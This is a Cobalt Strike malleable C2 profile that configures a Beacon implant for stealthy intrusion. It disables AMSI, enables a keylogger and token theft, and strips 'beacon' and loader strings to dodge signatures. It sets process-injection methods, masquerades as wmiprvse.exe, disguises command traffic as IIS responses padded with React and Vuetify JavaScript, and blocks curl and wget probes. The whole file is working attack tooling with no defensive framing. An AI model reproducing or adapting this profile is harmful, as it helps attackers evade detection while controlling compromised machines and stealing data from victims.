set sample_name "WAYLF";
set sleeptime "17424";         
set jitter    "46";           
set data_jitter "236";
# set headers_remove "Strict-Transport-Security"; # Comma-separated list of HTTP client headers to remove from Beacon C2.
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36";
https-certificate {
    set C   "UK";
    set CN  "kboxes.org";
    set O   "accountants";
    set OU  "f sales";
    set validity "365";
}
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";  
set steal_token_access_mask "11";
set tcp_port "29867";
set tcp_frame_header "\xbc\x53\xe3\x5c\x57\xf0\x8c\xa7\x83\x8f\xba\xd9\xc1\xf9\xd0\xbf\xf2\x69\xd8\x5f\xad\xa7\xaf\xb1\x54\xae\xa2\xc4\xb2\x73\xfd\x86\xff\xe6\xdf";
set pipename         "mojo.16140.17072.1536894351022793##"; # Name of pipe for SSH sessions. Each # is replaced with a random hex value.
#set pipename_stager  "Spool\\pipe_TYMH_##"; # Name of pipe to use for SMB Beacon's named pipe stager. Each # is replaced with a random hex value.
set smb_frame_header "\x61\xa6\x77\x8f\x60\xfc\xb4\x5e\x64\x6c\xdc\xaa\xb1\xbc\x65\x84"; # Prepend header to SMB Beacon messages


set host_stage "false"; 

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set cleanup "true";
    set amsi_disable "true";
    set pipename "mojo.16140.17072.1536894351022793##, mojo.16140.16544.184268595494289071##, mojo.16140.16544.78343966075273020##";
    set keylogger "GetAsyncKeyState"; 
}


stage {  
    set allocator      "MapViewOfFile";
    set userwx         "false";
    set magic_pe       "IV";
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    set sleep_mask     "true";
    set smartinject    "true";
    set checksum       "0";
    set compile_time   "02 Jan 2023 03:21:47";
    set entry_point    "606342";
    set image_size_x86 "575105";
    set image_size_x64 "559212";
    set name           "Setting.dll";
    set rich_header    "\x90\x62\x25\x80\xc0\x8b\xb4\xa8\xd7\xd7\xdc\xb1\xd6\x02\x86\xcb\xe1\x70\x9b\x15\x43\x30\x16\x13\xe8\xa6\x24\x00\xe5\xec\x4a\x20\x45\x7f\xd4\x86\x3a\x45\xaa\xe5\x87\xe4\x61\x99\xc1\xeb\xcd\x94\xdf\xf3\x22\xd7\xd0\x68\x03\x37\x36\x18\x57\x59\x48\xb4\xe8\x42\x8e\x16\x61\x78\xe5\xc0\xa0\x3b";
    ## WARNING: Module stomping 
    # set module_x86 "netshell.dll"; # Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
    # set module_x64 "netshell.dll"; # Same as module_x86; affects x64 loader
    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 { # blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        prepend "\x48\x41\x66\x87\xc9\x66\x87\xdb\x45\x40\x42\x0f\x1f\x00\x66\x87\xd2\x87\xdb\x40\x0f\x1f\x00\x43\x4c\x49\x0f\x1f\x04\x00\x66\x90\x44\x46\x90\x66\x0f\x1f\x04\x00\x47\x87\xd2\x0f\x1f\x00\x87\xc9"; # prepend nops
        strrep "ReflectiveLoader" "org";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "beacon" ""; # Remove this text
    	strrep "ReflectiveLoader" "";
    	strrep "beacon.x64.dll" "";
    	strrep "msvcrt.dll" "";
    	strrep "C:\\Windows\\System32\\msvcrt.dll" "";
    	strrep "Stack around the variable" "";
    	strrep "was corrupted." "";
    	strrep "The variable" "";
    	strrep "is being used without being initialized." "";
    	strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
    	strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
    	strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
    	strrep "Stack memory was corrupted" "";
    	strrep "A local variable was used before it was initialized" "";
    	strrep "Stack memory around _alloca was corrupted" "";
    	strrep "Unknown Runtime Check Error" "";
    	strrep "Unknown Filename" "";
    	strrep "Unknown Module Name" "";
    	strrep "Run-Time Check Failure" "";
    	strrep "Stack corrupted near unknown variable" "";
    	strrep "Stack pointer corruption" "";
    	strrep "Cast to smaller type causing loss of data" "";
    	strrep "Stack memory corruption" "";
    	strrep "Local variable used before initialization" "";
    	strrep "Stack around" "corrupted";
    	strrep "operator" "";
	    strrep "operator co_await" "";
    	strrep "operator<=>" "";
        append "\x48\x41\x66\x87\xc9\x66\x87\xdb\x45\x40\x42\x0f\x1f\x00\x66\x87\xd2\x87\xdb\x40\x0f\x1f\x00\x43\x4c\x49\x0f\x1f\x04\x00\x66\x90\x44\x46\x90\x66\x0f\x1f\x04\x00\x47\x87\xd2\x0f\x1f\x00\x87\xc9";
    }
    transform-x64 { #blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        prepend "\x48\x41\x66\x87\xc9\x66\x87\xdb\x45\x40\x42\x0f\x1f\x00\x66\x87\xd2\x87\xdb\x40\x0f\x1f\x00\x43\x4c\x49\x0f\x1f\x04\x00\x66\x90\x44\x46\x90\x66\x0f\x1f\x04\x00\x47\x87\xd2\x0f\x1f\x00\x87\xc9"; # prepend nops
        strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
        strrep "beacon" ""; # Remove this tex
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        strrep "Stack around the variable" "";
        strrep "was corrupted." "";
        strrep "The variable" "";
        strrep "is being used without being initialized." "";
        strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
        strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
        strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
        strrep "Stack memory was corrupted" "";
        strrep "A local variable was used before it was initialized" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around" "corrupted";
        strrep "operator" "";
        strrep "operator co_await" "";
        strrep "operator<=>" "";
        append "\x48\x41\x66\x87\xc9\x66\x87\xdb\x45\x40\x42\x0f\x1f\x00\x66\x87\xd2\x87\xdb\x40\x0f\x1f\x00\x43\x4c\x49\x0f\x1f\x04\x00\x66\x90\x44\x46\x90\x66\x0f\x1f\x04\x00\x47\x87\xd2\x0f\x1f\x00\x87\xc9";
    }
}

process-inject { 
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "false";
    set allocator "NtMapViewOfSection"; # Options: VirtualAllocEx, NtMapViewOfSection 
    set min_alloc "12764"; # 	Minimum amount of memory to request for injected content
    set startrwx "false"; # Use RWX as initial permissions for injected content. Alternative is RW.
    # review sleepmask and UDRL considerations for userwx
    set userwx   "false"; # Use RWX as final permissions for injected content. Alternative is RX.
    transform-x86 { 
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x48\x41\x66\x87\xc9\x66\x87\xdb\x45\x40\x42\x0f\x1f\x00\x66\x87\xd2\x87\xdb\x40\x0f\x1f\x00\x43\x4c\x49\x0f\x1f\x04\x00\x66\x90\x44\x46\x90\x66\x0f\x1f\x04\x00\x47\x87\xd2\x0f\x1f\x00\x87\xc9";
        append "\x48\x41\x66\x87\xc9\x66\x87\xdb\x45\x40\x42\x0f\x1f\x00\x66\x87\xd2\x87\xdb\x40\x0f\x1f\x00\x43\x4c\x49\x0f\x1f\x04\x00\x66\x90\x44\x46\x90\x66\x0f\x1f\x04\x00\x47\x87\xd2\x0f\x1f\x00\x87\xc9";
    }

    transform-x64 {
        # Make sure that prepended data is valid code for the injected content's architecture (x86, x64). The c2lint program does not have a check for this.
        prepend "\x48\x41\x66\x87\xc9\x66\x87\xdb\x45\x40\x42\x0f\x1f\x00\x66\x87\xd2\x87\xdb\x40\x0f\x1f\x00\x43\x4c\x49\x0f\x1f\x04\x00\x66\x90\x44\x46\x90\x66\x0f\x1f\x04\x00\x47\x87\xd2\x0f\x1f\x00\x87\xc9";
        append "\x48\x41\x66\x87\xc9\x66\x87\xdb\x45\x40\x42\x0f\x1f\x00\x66\x87\xd2\x87\xdb\x40\x0f\x1f\x00\x43\x4c\x49\x0f\x1f\x04\x00\x66\x90\x44\x46\x90\x66\x0f\x1f\x04\x00\x47\x87\xd2\x0f\x1f\x00\x87\xc9";
    }
  
    execute {
        # The execute block controls the methods Beacon will use when it needs to inject code into a process. Beacon examines each option in the execute block, determines if the option is usable for the current context, tries the method when it is usable, and moves on to the next option if code execution did not happen. 
        CreateThread "ntdll!RtlUserThreadStart+0x532";
        CreateThread;
        NtQueueApcThread-s;
        CreateRemoteThread;
        RtlCreateUserThread; 
    
    }
}

################################################
## HTTP Headers
################################################
http-config { # The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. 
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "gsw";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
    # Block Specific User Agents with a 404 (added in 4.3)
    set block_useragents "curl*,lynx*,wget*";
    # Allow Specific User Agents (added in 4.4);
    # allow_useragents ""; (if specified, block_useragents will take precedence)
}

################################################
## HTTP GET
################################################
http-get { # Don't think of this in terms of HTTP POST, but as a beacon transaction of pushing data to the server

    set uri "/run/frame/US1XVWWI1LT"; # URI used for GET requests
    set verb "GET"; 

    client {

        header "Accept" "application/xhtml+xml, text/html, image/*";
        header "Accept-Language" "nl-be";
        header "Accept-Encoding" "gzip, *";

        metadata {
            mask; # Transform type
            netbiosu; # Transform type
            prepend "_QLid="; # Cookie value
            header "Cookie";                                  # Cookie header
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/json; charset=utf-8";
        output {
            mask; # Transform type
            base64url; # Transform type
            prepend "
\"use strict\";var _interopRequireWildcard=require(\"@babel/runtime/helpers/interopRequireWildcard\");Object.defineProperty(exports,\"__esModule\",{value:!0});var _exportNames={colors:!0,Accordion:!0,AccordionActions:!0,AccordionDetails:!0,AccordionSummary:!0,AppBar:!0,Avatar:!0,Backdrop:!0,Badge:!0,BottomNavigation:!0,BottomNavigationAction:!0,Box:!0,Breadcrumbs:!0,Button:!0,ButtonBase:!0,ButtonGroup:!0,Card:!0,CardActionArea:!0,CardActions:!0,CardContent:!0,CardHeader:!0,CardMedia:!0,Checkbox:!0,Chip:!0,CircularProgress:!0,ClickAwayListener:!0,Collapse:!0,Container:!0,CssBaseline:!0,Dialog:!0,DialogActions:!0,DialogContent:!0,DialogContentText:!0,DialogTitle:!0,Divider:!0,Drawer:!0,ExpansionPanel:!0,ExpansionPanelActions:!0,ExpansionPanelDetails:!0,ExpansionPanelSummary:!0,Fab:!0,Fade:!0,FilledInput:!0,FormControl:!0,FormControlLabel:!0,FormGroup:!0,FormHelperText:!0,FormLabel:!0,Grid:!0,GridList:!0,GridListTile:!0,GridListTileBar:!0,Grow:!0,Hidden:!0,Icon:!0,IconButton:!0,ImageList:!0,ImageListItem:!0,ImageListItemBar:!0,Input:!0,InputAdornment:!0,InputBase:!0,InputLabel:!0,LinearProgress:!0,Link:!0,List:!0,ListItem:!0,ListItemAvatar:!0,ListItemIcon:!0,ListItemSecondaryAction:!0,ListItemText:!0,ListSubheader:!0,Menu:!0,MenuItem:!0,MenuList:!0,MobileStepper:!0,Modal:!0,NativeSelect:!0,NoSsr:!0,OutlinedInput:!0,Paper:!0,Popover:!0,Popper:!0,Portal:!0,Radio:!0,RadioGroup:!0,RootRef:!0,Select:!0,Slide:!0,Slider:!0,Snackbar:!0,SnackbarContent:!0,Step:!0,StepButton:!0,StepConnector:!0,StepContent:!0,StepIcon:!0,StepLabel:!0,Stepper:!0,SvgIcon:!0,SwipeableDrawer:!0,Switch:!0,Tab:!0,Table:!0,TableBody:!0,TableCell:!0,TableContainer:!0,TableFooter:!0,TableHead:!0,TablePagination:!0,TableRow:!0,TableSortLabel:!0,Tabs:!0,TabScrollButton:!0,TextField:!0,TextareaAutosize:!0,Toolbar:!0,Tooltip:!0,Typography:!0,Unstable_TrapFocus:!0,useMediaQuery:!0,useScrollTrigger:!0,withMobileDialog:!0,withWidth:!0,Zoom:!0};Object.defineProperty(exports,\"Accordion\",{enumerable:!0,get:function(){return _Accordion.default}}),Object.defineProperty(exports,\"AccordionActions\",{enumerable:!0,get:function(){return _AccordionActions.default}}),Object.defineProperty(exports,\"AccordionDetails\",{enumerable:!0,get:function(){return _AccordionDetails.default}}),Object.defineProperty(exports,\"AccordionSummary\",{enumerable:!0,get:function(){return _AccordionSummary.default}}),Object.defineProperty(exports,\"AppBar\",{enumerable:!0,get:function(){return _AppBar.default}}),Object.defineProperty(exports,\"Avatar\",{enumerable:!0,get:function(){return _Avatar.default}}),Object.defineProperty(exports,\"Backdrop\",{enumerable:!0,get:function(){return _Backdrop.default}}),Object.defineProperty(exports,\"Badge\",{enumerable:!0,get:function(){return _Badge.default}}),Object.defineProperty(exports,\"BottomNavigation\",{enumerable:!0,get:function(){return _BottomNavigation.default}}),Object.defineProperty(exports,\"BottomNavigationAction\",{enumerable:!0,get:function(){return _BottomNavigationAction.default}}),Object.defineProperty(exports,\"Box\",{enumerable:!0,get:function(){return _Box.default}}),Object.defineProperty(exports,\"Breadcrumbs\",{enumerable:!0,get:function(){return _Breadcrumbs.default}}),Object.defineProperty(exports,\"Button\",{enumerable:!0,get:function(){return _Button.default}}),Object.defineProperty(exports,\"ButtonBase\",{enumerable:!0,get:function(){return _ButtonBase.default}}),Object.defineProperty(exports,\"ButtonGroup\",{enumerable:!0,get:function(){return _ButtonGroup.default}}),Object.defineProperty(exports,\"Card\",{enumerable:!0,get:function(){return _Card.default}}),Object.defineProperty(exports,\"CardActionArea\",{enumerable:!0,get:function(){return _CardActionArea.default}}),Object.defineProperty(exports,\"CardActions\",{enumerable:!0,get:function(){return _CardActions.default}}),Object.defineProperty(exports,\"CardContent\",{enumerable:!0,get:function(){return _CardContent.default}}),Object.defineProperty(exports,\"CardHeader\",{enumerable:!0,get:function(){return _CardHeader.default}}),Object.defineProperty(exports,\"CardMedia\",{enumerable:!0,get:function(){return _CardMedia.default}}),Object.defineProperty(exports,\"Checkbox\",{enumerable:!0,get:function(){return _Checkbox.default}}),Object.defineProperty(exports,\"Chip\",{enumerable:!0,get:function(){return _Chip.default}}),Object.defineProperty(exports,\"CircularProgress\",{enumerable:!0,get:function(){return _CircularProgress.default}}),Object.defineProperty(exports,\"ClickAwayListener\",{enumerable:!0,get:function(){return _ClickAwayListener.default}}),Object.defineProperty(exports,\"Collapse\",{enumerable:!0,get:function(){return _Collapse.default}}),Object.defineProperty(exports,\"Container\",{enumerable:!0,get:function(){return _Container.default}}),Object.defineProperty(exports,\"CssBaseline\",{enumerable:!0,get:function(){return _CssBaseline.default}}),Object.defineProperty(exports,\"Dialog\",{enumerable:!0,get:function(){return _Dialog.default}}),Object.defineProperty(exports,\"DialogActions\",{enumerable:!0,get:function(){return _DialogActions.default}}),Object.defineProperty(exports,\"DialogContent\",{enumerable:!0,get:function(){return _DialogContent.default}}),Object.defineProperty(exports,\"DialogContentText\",{enumerable:!0,get:function(){return _DialogContentText.default}}),Object.defineProperty(exports,\"DialogTitle\",{enumerable:!0,get:function(){return _DialogTitle.default}}),Object.defineProperty(exports,\"Divider\",{enumerable:!0,get:function(){return _Divider.default}}),Object.defineProperty(exports,\"Drawer\",{enumerable:!0,get:function(){return _Drawer.default}}),Object.defineProperty(exports,\"ExpansionPanel\",{enumerable:!0,get:function(){return _ExpansionPanel.default}}),Object.defineProperty(exports,\"ExpansionPanelActions\",{enumerable:!0,get:function(){return _ExpansionPanelActions.default}}),Object.defineProperty(exports,\"ExpansionPanelDetails\",{enumerable:!0,get:function(){return _ExpansionPanelDetails.default}}),Object.defineProperty(exports,\"ExpansionPanelSummary\",{enumerable:!0,get:function(){return 
";
            append "
/*!
* Vuetify v3.0.3
* Forged by John Leider
* Released under the MIT License.
*/
!function(e,t){\"object\"==typeof exports&&\"undefined\"!=typeof module?t(exports,require(\"vue\")):\"function\"==typeof define&&define.amd?define([\"exports\",\"vue\"],t):t((e=\"undefined\"!=typeof globalThis?globalThis:e||self).Vuetify={},e.Vue)}(this,(function(e,t){\"use strict\"
const l=\"undefined\"!=typeof window,a=l&&\"IntersectionObserver\"in window,o=l&&(\"ontouchstart\"in window||window.navigator.maxTouchPoints>0),n=l&&\"undefined\"!=typeof CSS&&CSS.supports(\"selector(:focus-visible)\")
function r(e){const a=t.ref(),o=t.ref()
if(l){const l=new ResizeObserver((t=>{null==e||e(t,l),t.length&&(o.value=t[0].contentRect)}))
t.onBeforeUnmount((()=>{l.disconnect()})),t.watch(a,((e,t)=>{t&&(l.unobserve(t),o.value=void 0),e&&l.observe(e)}),{flush:\"post\"})}return{resizeRef:a,contentRect:t.readonly(o)}}function i(e,t,l){!function(e,t){if(t.has(e))throw new TypeError(\"Cannot initialize the same private elements twice on an object\")}(e,t),t.set(e,l)}function s(e,t,l){return function(e,t,l){if(t.set)t.set.call(e,l)
else{if(!t.writable)throw new TypeError(\"attempted to set read only private field\")
t.value=l}}(e,c(e,t,\"set\"),l),l}function u(e,t){return function(e,t){if(t.get)return t.get.call(e)
return t.value}(e,c(e,t,\"get\"))}function c(e,t,l){if(!t.has(e))throw new TypeError(\"attempted to \"+l+\" private field on non-instance\")
return t.get(e)}function d(e,t,l){const a=t.length-1
if(a<0)return void 0===e?l:e
for(let o=0;o<a;o++){if(null==e)return l
e=e[t[o]]}return null==e||void 0===e[t[a]]?l:e[t[a]]}function v(e,t){if(e===t)return!0
if(e instanceof Date&&t instanceof Date&&e.getTime()!==t.getTime())return!1
if(e!==Object(e)||t!==Object(t))return!1
const l=Object.keys(e)
return l.length===Object.keys(t).length&&l.every((l=>v(e[l],t[l])))}function p(e,t,l){return null!=e&&t&&\"string\"==typeof t?void 0!==e[t]?e[t]:d(e,(t=(t=t.replace(/\\[(\\w+)\\]/g,\".$1\")).replace(/^\\./,\"\")).split(\".\"),l):l}function f(e,t,l){if(null==t)return void 0===e?l:e
if(e!==Object(e)){if(\"function\"!=typeof t)return l
const a=t(e,l)
return void 0===a?l:a}if(\"string\"==typeof t)return p(e,t,l)
if(Array.isArray(t))return d(e,t,l)
if(\"function\"!=typeof t)return l
const a=t(e,l)
return void 0===a?l:a}function m(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0
return Array.from({length:e},((e,l)=>t+l))}function g(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:\"px\"
return null==e||\"\"===e?void 0:isNaN(+e)?String(e):isFinite(+e)?`${Number(e)}${t}`:void 0}function h(e){return null!==e&&\"object\"==typeof e&&!Array.isArray(e)}const y=Object.freeze({enter:13,tab:9,delete:46,esc:27,space:32,up:38,down:40,left:37,right:39,end:35,home:36,del:46,backspace:8,insert:45,pageup:33,pagedown:34,shift:16}),b=Object.freeze({enter:\"Enter\",tab:\"Tab\",delete:\"Delete\",esc:\"Escape\",space:\"Space\",up:\"ArrowUp\",down:\"ArrowDown\",left:\"ArrowLeft\",right:\"ArrowRight\",end:\"End\",home:\"Home\",del:\"Delete\",backspace:\"Backspace\",insert:\"Insert\",pageup:\"PageUp\",pagedown:\"PageDown\",shift:\"Shift\"})
function V(e){return Object.keys(e)}function S(e,t){const l=Object.create(null),a=Object.create(null)
for(const o in e)t.some((e=>e instanceof RegExp?e.test(o):e===o))?l[o]=e[o]:a[o]=e[o]
return[l,a]}function w(e,t){const l={...e}
return t.forEach((e=>delete l[e])),l}function k(e){return S(e,[\"class\",\"style\",\"id\",/^data-/])}function x(e){return null==e?[]:Array.isArray(e)?e:[e]}function C(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:0,l=arguments.length>2&&void 0!==arguments[2]?arguments[2]:1
return Math.max(t,Math.min(l,e))}function N(e,t){let l=arguments.length>2&&void 0!==arguments[2]?arguments[2]:\"0\"
return e+l.repeat(Math.max(0,t-e.length))}function _(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:1e3
if(e<t)return`${e} B`
const l=1024===t?[\"Ki\",\"Mi\",\"Gi\"]:[\"k\",\"M\",\"G\"]
let a=-1
for(;Math.abs(e)>=t&&a<l.length-1;)e/=t,++a
return`${e.toFixed(1)} ${l[a]}B`}function B(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},l=arguments.length>2?arguments[2]:void 0
const a={}
for(const t in e)a[t]=e[t]
";
            print;
        }

    }
}

################################################
## HTTP POST
################################################
http-post { # Don't think of this in terms of HTTP POST, but as a beacon transaction of pushing data to the server

    set uri "/Remove/b/4XAE9JHRI8"; # URI used for POST block. 
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST

    client {

        header "Accept" "application/json, text/html, application/xml";
        header "Accept-Language" "fo";
        header "Accept-Encoding" "*, identity";
       
        id {
            mask; # Transform type
            base64url; # Transform type
            parameter "_APOMUYNO";            
        }
              
        output {
            mask; # Transform type
            base64url; # Transform type
            print;
        }
    }

    server {

        header "Server" "Microsoft-IIS/10.0";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/json; charset=utf-8";

        output {
            mask; # Transform type
            base64url; # Transform type
            prepend "
\"use strict\";var _interopRequireDefault=require(\"@babel/runtime/helpers/interopRequireDefault\");Object.defineProperty(exports,\"__esModule\",{value:!0}),exports.default=exports.styleFunction=void 0;var _system=require(\"@material-ui/system\"),_styled=_interopRequireDefault(require(\"../styles/styled\")),styleFunction=(0,_system.styleFunctionSx)((0,_system.compose)(_system.borders,_system.display,_system.flexbox,_system.grid,_system.positions,_system.palette,_system.shadows,_system.sizing,_system.spacing,_system.typography));exports.styleFunction=styleFunction;var Box=(0,_styled.default)(\"div\")(styleFunction,{name:\"MuiBox\"}),_default=Box;exports.default=
";
            append "
\"use strict\";var _interopRequireWildcard=require(\"@babel/runtime/helpers/interopRequireWildcard\"),_interopRequireDefault=require(\"@babel/runtime/helpers/interopRequireDefault\");Object.defineProperty(exports,\"__esModule\",{value:!0}),exports.default=exports.styles=void 0;var _extends2=_interopRequireDefault(require(\"@babel/runtime/helpers/extends\")),_objectWithoutProperties2=_interopRequireDefault(require(\"@babel/runtime/helpers/objectWithoutProperties\")),React=_interopRequireWildcard(require(\"react\")),_propTypes=_interopRequireDefault(require(\"prop-types\")),_clsx=_interopRequireDefault(require(\"clsx\")),_withStyles=_interopRequireDefault(require(\"../styles/withStyles\")),_Fade=_interopRequireDefault(require(\"../Fade\")),styles={root:{zIndex:-1,position:\"fixed\",display:\"flex\",alignItems:\"center\",justifyContent:\"center\",right:0,bottom:0,top:0,left:0,backgroundColor:\"rgba(0, 0, 0, 0.5)\",WebkitTapHighlightColor:\"transparent\"},invisible:{backgroundColor:\"transparent\"}};exports.styles=styles;var Backdrop=React.forwardRef(function(e,r){var t=e.children,i=e.classes,o=e.className,a=e.invisible,s=void 0!==a&&a,p=e.open,l=e.transitionDuration,a=e.TransitionComponent,a=void 0===a?_Fade.default:a,e=(0,_objectWithoutProperties2.default)(e,[\"children\",\"classes\",\"className\",\"invisible\",\"open\",\"transitionDuration\",\"TransitionComponent\"]);return React.createElement(a,(0,_extends2.default)({in:p,timeout:l},e),React.createElement(\"div\",{className:(0,_clsx.default)(i.root,o,s&&i.invisible),\"aria-hidden\":!0,ref:r},t))});\"production\"!==process.env.NODE_ENV&&(Backdrop.propTypes={children:_propTypes.default.node,classes:_propTypes.default.object,className:_propTypes.default.string,invisible:_propTypes.default.bool,open:_propTypes.default.bool.isRequired,transitionDuration:_propTypes.default.oneOfType([_propTypes.default.number,_propTypes.default.shape({appear:_propTypes.default.number,enter:_propTypes.default.number,exit:_propTypes.default.number})])});var _default=(0,_withStyles.default)(styles,{name:\"MuiBackdrop\"})(Backdrop);exports.default=
";
            print;

        }
    }
}
